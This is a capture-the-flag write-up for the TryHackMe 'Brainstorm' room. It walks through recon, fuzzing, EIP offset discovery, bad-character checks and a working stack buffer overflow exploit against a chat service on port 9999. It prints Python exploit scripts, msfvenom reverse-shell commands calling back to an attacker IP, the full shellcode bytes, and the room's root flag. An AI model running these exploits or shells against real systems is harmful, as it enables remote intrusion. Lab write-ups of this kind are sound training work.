---
title: "Brainstorm"
---

:::info Description

This is a write-up for the [Brainstorm Room](https://tryhackme.com/room/brainstorm) on TryHackMe.

|OS|Level|Rating
|:---:|:-----:|:-----:|
|Windows|Medium|4/5|

:::

## RECON

### NMAP

ALL ports + `-Pn` cos ICMP is blocking : `nmap -v -sV 10.10.40.219 -Pn -p- -o nmap-brainstorm.txt`

I target 3389 port RDP for vulns using nmap:

```sh
└─$ nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 10.10.40.219 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-22 20:01 NZDT
Nmap scan report for 10.10.40.219
Host is up (0.28s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
| rdp-enum-encryption: 
|   Security layer
|     CredSSP (NLA): SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|     Native RDP: SUCCESS
|     RDSTLS: SUCCESS
|     SSL: SUCCESS
|   RDP Encryption level: Client Compatible
|     40-bit RC4: SUCCESS
|     56-bit RC4: SUCCESS
|     128-bit RC4: SUCCESS
|     FIPS 140-1: SUCCESS
|_  RDP Protocol Version:  RDP 5.x, 6.x, 7.x, or 8.x server
| rdp-ntlm-info: 
|   Target_Name: BRAINSTORM
|   NetBIOS_Domain_Name: BRAINSTORM
|   NetBIOS_Computer_Name: BRAINSTORM
|   DNS_Domain_Name: brainstorm
|   DNS_Computer_Name: brainstorm
|   Product_Version: 6.1.7601
|_  System_Time: 2022-01-22T07:01:52+00:00
```

Nothing.

Nmap results show:

```bash
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                Microsoft ftpd
3389/tcp open  ssl/ms-wbt-server?
9999/tcp open  abyss?
```

I check to see what is on port `9999` with `nc $TARGET_IP 9999`.

I see it's some kind of chat service.

I find an anonymous FTP access, I login browse around and find `chatserver.exe` and `essfunc.ddl` files.

## Buffer Overflow: Local Dev

I now have a copy of this "chat service" that I assume is the same one on the target machine, so I need to setup a local buffer overflow developing "lab".

I setup a Win7 VM to run the `chatserver.exe` program on.

I installed immunity debugger on the Win7 VM to develop my local buffer overflow exploit, which I will use on the THM box once complete.

### Fuzzing

Start up immunity debugger (ImmD) on the Win7 VM, run the `chatserver.exe` from ImmD.

I borrowed the BufferOverflowPrep rooms python scripts to use on the BRAINSTORM room starting with the fuzzer on port 9999

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.28.156"

port = 9999
timeout = 5

string = "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

Fuzzing crashed at 6300 bytes.

### Find EIP

pattern create: `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 6700`

EIP value on crash = `48367648`

pattern offset: `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 6700 -q 48367648`

Exact match at offset 6108

eip.py looks like this:

```python
#!/usr/bin/env python3

import socket

ip = "172.16.2.125"
port = 9999

offset = 6108
overflow = "A" * offset
retn = "BBBB"

buffer = overflow + retn
print("buffer=",len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Crash Overwrite EIP: 42424242...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

running `./eip.py` we get the correct output of EIP overwritten with our 4 x B's (42424242).

### Bad Chars

Set mona work dir: `!mona config -set workingfolder C:\Users\IEUser\Downloads\%p`

let's use mona to create our byte array and test for bad chars.

`!mona compare -f C:\Users\IEUser\Downloads\chatserver\bytearray.bin -a 0187EEC0`

I did `-b \x00\x01` and got unmodified status, but `\x01` was a legit byte, just corrupted by nullbyte.

ran again with just nullbyte arraay, compared:

`!mona compare -f C:\Users\IEUser\Downloads\chatserver\bytearray.bin -a 0171EEC0`

got unmodified status.

### payload structure

Your payload must be in this order: `offset + retn + payload` <- the EIP still needs to be overwritten predictively.

### jmp point address

`!mona jmp -r esp -cpb "\x00"`

```sh
625014DF     0x625014df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Downloads\essfunc.dll)
625014EB     0x625014eb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Downloads\essfunc.dll)
625014F7     0x625014f7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Downloads\essfunc.dll)
62501503     0x62501503 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Downloads\essfunc.dll)
6250150F     0x6250150f : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Downloads\essfunc.dll)
6250151B     0x6250151b : jmp esp | asciiprint,ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Downloads\essfunc.dll)
62501527     0x62501527 : jmp esp | asciiprint,ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Downloads\essfunc.dll)
62501533     0x62501533 : jmp esp | asciiprint,ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Downloads\essfunc.dll)
62501535     0x62501535 : jmp esp | asciiprint,ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Downloads\essfunc.dll)
0BADF00D       Found a total of 9 pointers
```

I pick `0x62 50 14 f7` = `\xf7\x14\x50\x62`

our payload script looks like this:

```python
#!/usr/bin/env python3

import socket

ip = "172.16.2.125"
port = 9999

offset = 6108
overflow = "A" * offset
retn = "\xf7\x14\x50\x62" # found using mona
padding = "\x90" * 16
payload = (

)
postfix = ""

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

```

### shellcode

create some shell code: `msfvenom -p windows/shell_reverse_tcp LHOST=172.16.2.106 LPORT=4444 EXITFUNC=thread -b "\x00" -f c`

## Buffer Overflow: Live Target

NOTE: dev machine ip in shellcode needs to change to my tun0 (VPN) interface IP, and the ip address of the destination server in the python script needs to point to THM box.

After trying the exact same shellcode but changing for the THM LHOST, I failed to get a shell.... suggestion from a stream follower said "try on a legit or lower port, not 4444".

I re-created my reverse shellcode, with port 80

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.55.83 LPORT=80 EXITFUNC=thread -b "\x00" -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] = 
"\xdb\xda\xb8\x4c\xf0\x7a\x5c\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x52\x31\x43\x17\x03\x43\x17\x83\x8f\xf4\x98\xa9\xf3\x1d\xde"
"\x52\x0b\xde\xbf\xdb\xee\xef\xff\xb8\x7b\x5f\x30\xca\x29\x6c"
"\xbb\x9e\xd9\xe7\xc9\x36\xee\x40\x67\x61\xc1\x51\xd4\x51\x40"
"\xd2\x27\x86\xa2\xeb\xe7\xdb\xa3\x2c\x15\x11\xf1\xe5\x51\x84"
"\xe5\x82\x2c\x15\x8e\xd9\xa1\x1d\x73\xa9\xc0\x0c\x22\xa1\x9a"
"\x8e\xc5\x66\x97\x86\xdd\x6b\x92\x51\x56\x5f\x68\x60\xbe\x91"
"\x91\xcf\xff\x1d\x60\x11\x38\x99\x9b\x64\x30\xd9\x26\x7f\x87"
"\xa3\xfc\x0a\x13\x03\x76\xac\xff\xb5\x5b\x2b\x74\xb9\x10\x3f"
"\xd2\xde\xa7\xec\x69\xda\x2c\x13\xbd\x6a\x76\x30\x19\x36\x2c"
"\x59\x38\x92\x83\x66\x5a\x7d\x7b\xc3\x11\x90\x68\x7e\x78\xfd"
"\x5d\xb3\x82\xfd\xc9\xc4\xf1\xcf\x56\x7f\x9d\x63\x1e\x59\x5a"
"\x83\x35\x1d\xf4\x7a\xb6\x5e\xdd\xb8\xe2\x0e\x75\x68\x8b\xc4"
"\x85\x95\x5e\x4a\xd5\x39\x31\x2b\x85\xf9\xe1\xc3\xcf\xf5\xde"
"\xf4\xf0\xdf\x76\x9e\x0b\x88\x72\x54\x24\x1b\xeb\x68\x4a\x9b"
"\xbb\xe5\xac\xf1\x2b\xa0\x67\x6e\xd5\xe9\xf3\x0f\x1a\x24\x7e"
"\x0f\x90\xcb\x7f\xde\x51\xa1\x93\xb7\x91\xfc\xc9\x1e\xad\x2a"
"\x65\xfc\x3c\xb1\x75\x8b\x5c\x6e\x22\xdc\x93\x67\xa6\xf0\x8a"
"\xd1\xd4\x08\x4a\x19\x5c\xd7\xaf\xa4\x5d\x9a\x94\x82\x4d\x62"
"\x14\x8f\x39\x3a\x43\x59\x97\xfc\x3d\x2b\x41\x57\x91\xe5\x05"
"\x2e\xd9\x35\x53\x2f\x34\xc0\xbb\x9e\xe1\x95\xc4\x2f\x66\x12"
"\xbd\x4d\x16\xdd\x14\xd6\x36\x3c\xbc\x23\xdf\x99\x55\x8e\x82"
"\x19\x80\xcd\xba\x99\x20\xae\x38\x81\x41\xab\x05\x05\xba\xc1"
"\x16\xe0\xbc\x76\x16\x21";
```

Ran it again, and got a shell:

root.txt = `5b1001de5a44eca47eee71e7942a8f8a` under `C:\Users\drake\Desktop\root.txt`